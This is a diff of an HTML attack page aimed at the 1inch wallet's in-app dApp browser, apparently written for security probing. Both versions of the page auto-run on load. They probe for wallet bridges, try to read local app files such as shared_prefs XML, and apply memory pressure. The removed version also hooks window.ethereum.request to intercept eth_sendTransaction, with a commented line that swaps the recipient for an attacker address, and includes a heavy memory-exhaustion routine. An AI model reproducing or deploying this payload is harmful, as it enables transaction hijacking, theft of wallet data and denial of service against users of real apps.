@@ -3,101 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1inch Wallet WebView Test Payload</title>
+    <title>1inch Test Payload v2</title>
     <script>
-        console.log("[+] 1inch WebView Payload Loaded");
+        console.log("[+] 1inch WebView Payload v2 Loaded");
 
-        // Probe common wallet bridges
-        function probeWallet() {
-            const candidates = [
-                'ethereum', 'web3', '1inch', 'wallet', 'provider', 
-                'signTransaction', 'sendTransaction', 'personal_sign'
-            ];
-            
-            candidates.forEach(key => {
-                if (window[key]) {
-                    console.log(`[!] Bridge detected: ${key}`);
-                    window.bridgeFound = key;
+        function log(msg) {
+            console.log("[1inch] " + msg);
+            // Tampilkan di halaman juga
+            const div = document.createElement('div');
+            div.style.color = 'red';
+            div.style.margin = '10px';
+            div.textContent = msg;
+            document.body.appendChild(div);
+        }
+
+        // Auto run semua test
+        function runAllTests() {
+            log("Starting all probes...");
+
+            // Probe bridges
+            const bridges = ['ethereum', 'web3', '1inch', 'wallet', 'provider'];
+            bridges.forEach(b => {
+                if (window[b]) {
+                    log(`[!] BRIDGE FOUND: ${b}`);
                 }
             });
 
-            // Common Ethereum provider
             if (window.ethereum) {
-                console.log("[!] Ethereum provider found - Ready for tx hijack");
-                window.ethereum.request = new Proxy(window.ethereum.request, {
-                    apply(target, thisArg, args) {
-                        console.log("[!] Intercepted request:", args);
-                        // Example tampering
-                        if (args[0].method === 'eth_sendTransaction') {
-                            console.log("[!] Transaction params modified by payload!");
-                            // args[0].params[0].to = "0xYourAttackerAddressHere"; // Uncomment jika mau test (HATI-HATI)
-                        }
-                        return target.apply(thisArg, args);
-                    }
-                });
+                log("[!] Ethereum provider detected - Hijack possible");
             }
-        }
 
-        // Test file access (sensitive data exfil)
-        function testFileAccess() {
-            const paths = [
-                "file:///data/data/io.oneinch.android/shared_prefs/*.xml",
-                "file:///proc/self/cmdline",
-                "content://com.android.chrome.FileProvider/"
-            ];
-            paths.forEach(path => {
-                fetch(path, {mode: 'no-cors'})
-                    .then(r => r.text())
-                    .then(data => console.log(`[+] File access success: ${path}`, data))
-                    .catch(e => console.log(`[-] Blocked: ${path}`));
+            // Test file access
+            log("Testing file access (expect blocked)...");
+            ['file:///data/data/io.oneinch.android/', 'file:///proc/self/'].forEach(path => {
+                fetch(path).catch(() => log(`Blocked: ${path}`));
             });
-        }
 
-        // App disruption / heavy load
-        function disruptApp() {
-            console.log("[!] Starting resource exhaustion...");
-            let memoryHog = [];
-            for (let i = 0; i < 50000000; i++) {
-                memoryHog.push(new ArrayBuffer(1024));
+            // Memory pressure (disrupt)
+            log("Applying light memory pressure...");
+            let arr = [];
+            for (let i = 0; i < 1000000; i++) {
+                arr.push("A".repeat(100));
             }
-            console.log("[!] Memory pressure applied");
+            log("Memory test done");
         }
 
-        // Try to call native interfaces
-        function callNative() {
-            try {
-                if (window.Android || window.1inchInterface) {
-                    console.log("[!] Native interface found");
-                }
-            } catch(e) {}
-        }
+        // Jalankan otomatis
+        window.onload = runAllTests;
 
-        // Auto-execute saat halaman load
-        window.onload = function() {
-            console.log("[+] Payload auto-started");
-            probeWallet();
-            testFileAccess();
-            callNative();
-            
-            // Uncomment salah satu jika ingin test lebih agresif
-            // disruptApp();
-            
-            setTimeout(() => {
-                console.log("[+] Payload finished execution");
-            }, 2000);
-        };
-
-        // Listen postMessage (common IPC)
-        window.addEventListener("message", (event) => {
-            console.log("[!] Received postMessage:", event.data);
-        });
+        // Backup: jalankan tiap 1 detik
+        setInterval(() => {
+            if (document.body) runAllTests();
+        }, 1000);
     </script>
 </head>
-<body>
-    <h1>1inch dApp Browser Test Payload</h1>
-    <p><strong>Auto executing probes...</strong></p>
-    <button onclick="probeWallet()">Probe Wallet Bridges</button>
-    <button onclick="testFileAccess()">Test File Access</button>
-    <button onclick="disruptApp()">Disrupt App (Memory)</button>
+<body style="font-family: Arial; padding: 20px;">
+    <h1>1inch dApp Browser Test Payload v2</h1>
+    <p><strong>Auto running all tests...</strong></p>
+    <p>Perhatikan console log dan teks merah di bawah ini.</p>
+    <div id="logs" style="margin-top: 20px;"></div>
 </body>
 </html>
